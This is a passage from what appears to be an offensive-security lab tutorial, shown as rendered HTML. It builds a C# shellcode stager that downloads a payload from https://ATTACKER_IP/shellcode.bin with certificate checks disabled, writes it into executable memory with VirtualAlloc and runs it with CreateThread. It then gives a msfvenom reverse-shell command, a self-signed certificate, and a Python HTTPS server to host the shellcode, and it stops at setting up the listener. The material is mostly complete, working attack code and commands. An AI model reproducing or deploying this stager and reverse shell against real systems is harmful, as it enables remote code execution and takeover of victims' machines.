class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> MEM_COMMIT </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1000</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> PAGE_EXECUTE_READWRITE </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">string</span><span class="token plain"> url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;https://ATTACKER_IP/shellcode.bin&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">Stager</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Stager</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name keyword" style="color:#00009f">string</span><span class="token plain"> url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">WebClient</span><span class="token plain"> wc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token constructor-invocation class-name">WebClient</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServicePointManager</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ServerCertificateValidationCallback </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">delegate</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServicePointManager</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">SecurityProtocol </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> SecurityProtocolType</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Tls12</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> shellcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> wc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">DownloadData</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">UInt32</span><span class="token plain"> codeAddr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">UInt32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MEM_COMMIT</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> PAGE_EXECUTE_READWRITE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Marshal</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Copy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">IntPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">codeAddr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">IntPtr</span><span class="token plain"> threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">UInt32</span><span class="token plain"> threadId </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">IntPtr</span><span class="token plain"> parameter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> codeAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> parameter</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> threadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">threadHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xFFFFFFFF</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div></div></div></details>
<p>The code may look intimidating at first but is relatively straightforward. Let&#x27;s analyze what it does step by step.</p>
<p>The first part of the code will import some Windows API functions via P/Invoke. The functions we need are the following three from <code>kernel32.dll</code>:</p>
<table><thead><tr><th style="text-align:left">WinAPI Function</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left"><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc" target="_blank" rel="noopener noreferrer" class="">VirtualAlloc()</a></td><td style="text-align:left">Allows us to reserve some memory to be used by our shellcode.</td></tr><tr><td style="text-align:left"><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread" target="_blank" rel="noopener noreferrer" class="">CreateThread()</a></td><td style="text-align:left">Creates a thread as part of the current process.</td></tr><tr><td style="text-align:left"><a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject" target="_blank" rel="noopener noreferrer" class="">WaitForSingleObject()</a></td><td style="text-align:left">Used for thread synchronization. It allows us to wait for a thread to finish before continuing.</td></tr></tbody></table>
<p>The part of the code in charge of importing these functions is the following:</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token function" style="color:#d73a49">DllImport</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flAllocationType</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token function" style="color:#d73a49">DllImport</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">IntPtr</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadAttributes</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwStackSize</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddress</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">IntPtr</span><span class="token plain"> param</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwCreationFlags</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token function" style="color:#d73a49">DllImport</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">IntPtr</span><span class="token plain"> hHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwMilliseconds</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>The most significant part of our code will be in the <code>Stager()</code> function, where the stager logic will be implemented. The Stager function will receive a URL from where the shellcode to be executed will be downloaded.</p>
<p>The first part of the <code>Stager()</code> function will create a new <code>WebClient()</code> object that allows us to download the shellcode using web requests. Before making the actual request, we will overwrite the <code>ServerCertificateValidationCallback</code> method in charge of validating SSL certificates when using HTTPS requests so that the WebClient doesn&#x27;t complain about self-signed or invalid certificates, which we will be using in the web server hosting the payloads. After that, we will call the <code>DownloadData()</code> method to download the shellcode from the given URL and store it into the <code>shellcode</code> variable:</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token class-name">WebClient</span><span class="token plain"> wc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token constructor-invocation class-name">WebClient</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServicePointManager</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ServerCertificateValidationCallback </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">delegate</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServicePointManager</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">SecurityProtocol </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> SecurityProtocolType</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Tls12</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> shellcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> wc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">DownloadData</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>Once our shellcode is downloaded and available in the <code>shellcode</code> variable, we&#x27;ll need to copy it into executable memory before actually running it. We use <code>VirtualAlloc()</code> to request a memory block from the operating system. Notice that we request enough memory to allocate <code>shellcode.Length</code> bytes, and set the <code>PAGE_EXECUTE_READWRITE</code> flag, making the assigned memory executable, readable and writable. Once our executable memory block is reserved and assigned to the codeAddr variable, we use Marshal.Copy() to copy the contents of the shellcode variable in the codeAddr variable.</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token class-name">UInt32</span><span class="token plain"> codeAddr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">UInt32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MEM_COMMIT</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> PAGE_EXECUTE_READWRITE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Marshal</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Copy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">IntPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">codeAddr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>Now that we have a copy of the shellcode allocated in a block of executable memory, we use the <code>CreateThread()</code> function to spawn a new thread on the current process that will execute our shellcode. The third parameter passed to CreateThread points to <code>codeAddr</code>, where our shellcode is stored, so that when the thread starts, it runs the contents of our shellcode as if it were a regular function. The fifth parameter is set to 0, meaning the thread will start immediately.</p>
<p>Once the thread has been created, we will call the <code>WaitForSingleObject()</code> function to instruct our current program that it has to wait for the thread execution to finish before continuing. This prevents our program from closing before the shellcode thread gets a chance to execute:</p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token class-name">IntPtr</span><span class="token plain"> threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token class-name">UInt32</span><span class="token plain"> threadId </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token class-name">IntPtr</span><span class="token plain"> parameter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> codeAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> parameter</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> threadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">threadHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xFFFFFFFF</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>To compile the code, we suggest copying it into a Windows machine as a file called staged-payload.cs and compiling it with the following command:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">PowerShell</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> csc staged-payload.cs</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="using-our-stager-to-run-a-reverse-shell">Using our stager to run a reverse shell<a href="#using-our-stager-to-run-a-reverse-shell" class="hash-link" aria-label="Direct link to Using our stager to run a reverse shell" title="Direct link to Using our stager to run a reverse shell" translate="no">​</a></h3>
<p>Once our payload is compiled, we will need to set up a web server to host the final shellcode. Remember that our stager will connect to this server to retrieve the shellcode and execute it in the victim machine in-memory. Let&#x27;s start by generating a shellcode (the name of the file needs to match the URL in our stager):</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">AttackBox</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/shell_reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">ATTACKER_IP </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">7474</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> raw </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> shellcode.bin </span><span class="token parameter variable" style="color:#36acaa">-b</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;\x00\x0a\x0d&#x27;</span><br></span></code></pre></div></div>
<p>Notice that we are using the raw format for our shellcode, as the stager will directly load whatever it downloads into memory.</p>
<p>Now that we have a shellcode, let&#x27;s set up a simple HTTPS server. First, we will need to create a self-signed certificate with the following command:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">AttackBox</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ openssl req </span><span class="token parameter variable" style="color:#36acaa">-new</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-x509</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-keyout</span><span class="token plain"> localhost.pem </span><span class="token parameter variable" style="color:#36acaa">-out</span><span class="token plain"> localhost.pem </span><span class="token parameter variable" style="color:#36acaa">-days</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">365</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-nodes</span><br></span></code></pre></div></div>
<p>You will be asked for some information, but feel free to press enter for any requested information, as we don&#x27;t need the SSL certificate to be valid. Once we have an SSL certificate, we can spawn a simple HTTPS server using python3 with the following command:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">AttackBox</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ python3 </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;import http.server, ssl;server_address=(&#x27;0.0.0.0&#x27;,443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile=&#x27;localhost.pem&#x27;,ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()&quot;</span><br></span></code></pre></div></div>
<p>With all of this ready, we can now execute our stager payload. The stager should connect to the HTTPS server and retrieve the shellcode.bin file to load it into memory and run it on the victim machine. Remember to set up an nc listener to receive the reverse shell on the same port specified when running msfvenom:</p>
